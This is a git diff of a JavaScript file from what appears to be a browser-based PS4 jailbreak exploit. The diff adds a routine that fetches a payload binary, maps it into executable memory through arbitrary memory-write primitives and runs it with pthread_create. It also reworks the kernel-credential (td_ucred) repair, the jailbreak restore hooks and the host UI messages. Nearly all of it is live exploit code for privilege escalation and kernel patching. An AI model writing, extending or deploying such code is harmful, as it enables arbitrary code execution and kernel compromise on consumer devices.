@@ -3,53 +3,14 @@ import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
 
-function ensureHostConsole() {
-  var out = document.getElementById("out");
-  var st = document.getElementById("state");
-  if (!out) {
-    out = document.createElement("pre");
-    out.id = "out";
-    (document.body || document.documentElement).appendChild(out);
-  }
-  if (!st) {
-    st = document.createElement("div");
-    st.id = "state";
-    (document.body || document.documentElement).appendChild(st);
-  }
-  return { outEl: out, stateEl: st };
-}
-var _hostCons = ensureHostConsole();
-const outEl = _hostCons.outEl;
-const stateEl = _hostCons.stateEl;
+const outEl = document.getElementById("out");
+const stateEl = document.getElementById("state");
 const lines = [];
 let passCount = 0,
   failCount = 0;
 let armedEver = false;
-let alreadyLoaded = false;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
-
-function hostOk() {
-  var m = document.getElementById("msgs");
-  if (m) {
-    m.innerHTML = "GoldHEN v2.4b18.12 Loaded ...";
-  }
-}
-
-function hostFail() {
-  var m = document.getElementById("msgs");
-  if (m) {
-    m.innerHTML = "Failed to Load! Restart Your Console ...";
-    m.style.color = "yellow";
-  }
-}
-
-function hostAlready() {
-  var m = document.getElementById("msgs");
-  if (m) {
-    m.innerHTML = "GoldHEN is Already Loaded ...";
-  }
-}
 
 function post(tag, detail) {
   try {
@@ -90,9 +51,14 @@ function terse(s) {
 const SHOW_LOG = params.get("log") === "1";
 if (SHOW_LOG && document.body) document.body.className = "log";
 function finishUI(ok) {
-  if (ok) hostOk();
-  else hostFail();
   if (SHOW_LOG || !document.body) return;
+  const m = document.getElementById("msg");
+  if (m)
+    m.textContent = ok
+      ? "DONE"
+      : armedEver
+        ? "Restart your console"
+        : "Refresh the page and run again";
   document.body.className = ok ? "done" : "fail";
 }
 function mark(tag, detail) {
@@ -187,10 +153,6 @@ let allDone = false,
   const opened = [];
   let closeFd = null;
   try {
-    await new Promise(function (r) {
-      setTimeout(r, 100);
-    });
-	  
     const { key, off } = offsetsFor(navigator.userAgent);
     mark("BUILD", "jb=skipjb2 base=ef1670a");
     mark("FW", key || "(not a PS4 UA)");
@@ -236,8 +198,8 @@ let allDone = false,
       return;
 
     const KPATCH_FILE =
-      "slopkit/patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
-    const PAYLOAD_FILE = "goldhen_2.4b18.12.bin";
+      "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
+    const PAYLOAD_FILE = off.payload || "payload.bin";
     const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
       (k) => off[k] === undefined,
     );
@@ -578,6 +540,63 @@ let allDone = false,
       const a = new int64(r.lo, r.hi);
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
     }
+    async function relaunchPayload() {
+      let blob = null;
+      try {
+        const r = await fetch(PAYLOAD_FILE);
+        if (r.ok) blob = new Uint8Array(await r.arrayBuffer());
+      } catch (e) {}
+      if (!blob || blob[0] !== 0xe9) {
+        mark("JB-RELAUNCH", "file=" + PAYLOAD_FILE + " blob=unusable");
+        return;
+      }
+      const sz = (blob.length + 0x3fff) & ~0x3fff;
+      const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
+      const entry = new int64(m.lo, m.hi);
+      if (m.i32 === -1 || entry.hi >>> 0 === 0) {
+        mark("JB-RELAUNCH", "mmap failed err=" + errno());
+        return;
+      }
+      for (let o = 0; o < blob.length; o += 8) {
+        let lo = 0,
+          hi = 0;
+        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
+        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
+        p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
+      }
+      let bad = -1;
+      for (let o = 0; o < blob.length && bad < 0; o++)
+        if (p.read1(entry.add32(o)) !== blob[o]) bad = o;
+      if (bad >= 0) {
+        mark("JB-RELAUNCH", "copy MISMATCH@0x" + bad.toString(16));
+        return;
+      }
+      const fn = p.read8(webkitBase.add32(off.wk___imp_pthread_create));
+      const expect = libkernelBase.add32(off.k_pthread_create);
+      if (fn.low !== expect.low || fn.hi !== expect.hi) {
+        mark("JB-RELAUNCH", "pthread_create got=" + fn + " want=" + expect);
+        return;
+      }
+      const thr = new ArrayBuffer(8);
+      keepAlive.push(thr);
+      new Uint8Array(thr).fill(0);
+      const rc = callAddr(expect, [bufAddr(thr), 0, entry, 0]).i32;
+      const tdv = new DataView(thr);
+      const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
+      payloadRunning = rc === 0 && handle.hi >>> 0 > 0;
+      check(
+        "JB-RELAUNCH",
+        payloadRunning,
+        "file=" +
+          PAYLOAD_FILE +
+          " bytes=" +
+          blob.length +
+          " pthread_create=" +
+          rc +
+          " handle=" +
+          handle,
+      );
+    }
 
     const pid = sc(SYS.getpid).i32;
     check(
@@ -608,22 +627,21 @@ let allDone = false,
         const uidNow = sc(SYS.getuid).i32;
         mark("JB-PROBE", "setuid=" + suRv + " uid=" + uidNow);
         if (suRv === 0 && uidNow === 0) {
-          alreadyLoaded = true;
           jailbroken = true;
-          payloadRunning = true;
-          allDone = true;
           mark(
             "JB-ALREADY",
             "kernel already patched -- 663 race skipped, pid=" + pid,
           );
+          if (DO_PAYLOAD) await relaunchPayload();
           mark(
             "EG-VERDICT",
             "fw=" +
               fwKey +
-              " jailbroken=1 kpatched=already payload_running=0" +
-              " armings=0 reused=1 already=1",
+              " jailbroken=1 kpatched=already payload_running=" +
+              (payloadRunning ? 1 : 0) +
+              " armings=0 reused=1",
           );
-          hostAlready();
+          allDone = true;
           return;
         }
       }
@@ -720,7 +738,7 @@ let allDone = false,
 
     async function bringWorker(name) {
       const w = { name: name, armed: false, wired: false };
-      w.worker = new Worker("slopkit/rpc_worker.js");
+      w.worker = new Worker("rpc_worker.js");
       w.rpc = makeRpc(w.worker, name);
       if ((await w.rpc("ping", 15000)) !== "pong")
         throw new Error(name + " ping");
@@ -3448,67 +3466,7 @@ let allDone = false,
               }
             }
 
-            let tdOk = false;
-            try {
-              const TDU = CT1.add32(0x130);
-              const before = read8(TDU);
-              const wasOk = sameI64(before, UCRED);
-              if (!wasOk) write8(TDU, UCRED);
-              const after = read8(TDU);
-              tdOk = sameI64(after, UCRED);
-              mark(
-                "JB-TDUCRED",
-                "w1.td_ucred=" +
-                  before +
-                  " want=" +
-                  UCRED +
-                  " passB_restore_was_exact=" +
-                  (wasOk ? 1 : 0) +
-                  " repaired=" +
-                  (wasOk ? 0 : 1) +
-                  " now=" +
-                  after,
-              );
-              check(
-                "JB-TDUCRED-CLEAN",
-                tdOk,
-                "w1.td_ucred must equal the real ucred before this thread is" +
-                  " torn down at process exit (crfree runs on it)",
-              );
-            } catch (e6) {
-              tdOk = false;
-              mark("JB-TDUCRED-THREW", (e6 && e6.message) || String(e6));
-            }
-
-            let restoreOk = true;
-            if (jbRestoreHook && !KEEP_JB) {
-              restoreOk = !!jbRestoreHook("end-of-run");
-            } else if (jbRestoreHook) {
-              mark(
-                "JB-KEEP",
-                "?keepjb=1 -- jailbreak left LIVE. The handles will" +
-                  " be restored on pagehide; if the browser is killed instead," +
-                  " REBOOT rather than closing it.",
-              );
-              window.addEventListener("pagehide", function () {
-                try {
-                  jbRestoreHook("pagehide");
-                } catch (e) {}
-              });
-            }
-
-            const cleanEnough = tdOk && (KEEP_JB || restoreOk);
-
-            if (!cleanEnough) {
-              mark(
-                "PAYLOAD-SKIPPED",
-                "cleanup incomplete (tdOk=" +
-                  (tdOk ? 1 : 0) +
-                  " restoreOk=" +
-                  (restoreOk ? 1 : 0) +
-                  ") -- reboot required",
-              );
-            } else if (
+            if (
               kpDone &&
               DO_PAYLOAD &&
               payloadBlob &&
@@ -3572,6 +3530,7 @@ let allDone = false,
                     tdv.getUint32(4, true),
                   );
                   plDone = rc === 0 && handle.hi >>> 0 > 0;
+                  payloadRunning = plDone;
                   mark(
                     "PAYLOAD-RUN",
                     "pthread_create=" + rc + " handle=" + handle,
@@ -3585,8 +3544,49 @@ let allDone = false,
               }
             }
 
-            const stable = !!plDone && cleanEnough;
-            payloadRunning = stable;
+            try {
+              const TDU = CT1.add32(0x130);
+              const before = read8(TDU);
+              const wasOk = sameI64(before, UCRED);
+              if (!wasOk) write8(TDU, UCRED);
+              const after = read8(TDU);
+              mark(
+                "JB-TDUCRED",
+                "w1.td_ucred=" +
+                  before +
+                  " want=" +
+                  UCRED +
+                  " passB_restore_was_exact=" +
+                  (wasOk ? 1 : 0) +
+                  " repaired=" +
+                  (wasOk ? 0 : 1) +
+                  " now=" +
+                  after,
+              );
+              check(
+                "JB-TDUCRED-CLEAN",
+                sameI64(after, UCRED),
+                "w1.td_ucred must equal the real ucred before this thread is" +
+                  " torn down at process exit (crfree runs on it)",
+              );
+            } catch (e6) {
+              mark("JB-TDUCRED-THREW", (e6 && e6.message) || String(e6));
+            }
+
+            if (jbRestoreHook && !KEEP_JB) jbRestoreHook("end-of-run");
+            else if (jbRestoreHook) {
+              mark(
+                "JB-KEEP",
+                "?keepjb=1 -- jailbreak left LIVE. The handles will" +
+                  " be restored on pagehide; if the browser is killed instead," +
+                  " REBOOT rather than closing it.",
+              );
+              window.addEventListener("pagehide", function () {
+                try {
+                  jbRestoreHook("pagehide");
+                } catch (e) {}
+              });
+            }
 
             mark(
               "EG-VERDICT",
@@ -3600,16 +3600,13 @@ let allDone = false,
                 (kpDone ? 1 : 0) +
                 " payload_running=" +
                 (plDone ? 1 : 0) +
-                " stable=" +
-                (stable ? 1 : 0) +
-                " tdOk=" +
-                (tdOk ? 1 : 0) +
-                " restoreOk=" +
-                (restoreOk ? 1 : 0) +
                 " armings=" +
-                armCount,
+                armCount +
+                " jb_restored=" +
+                (jbRestored ? 1 : 0) +
+                "  (.data/.text/caps need a reboot; the refcounted handles do not)",
             );
-            allDone = stable;
+            allDone = true;
           }
         }
       }
@@ -3867,7 +3864,7 @@ let allDone = false,
         (allDone ? "" : "  INCOMPLETE"),
     );
     try {
-      if (!alreadyLoaded) finishUI(payloadRunning);
+      finishUI(payloadRunning);
     } catch (eUI) {}
   }
 })();
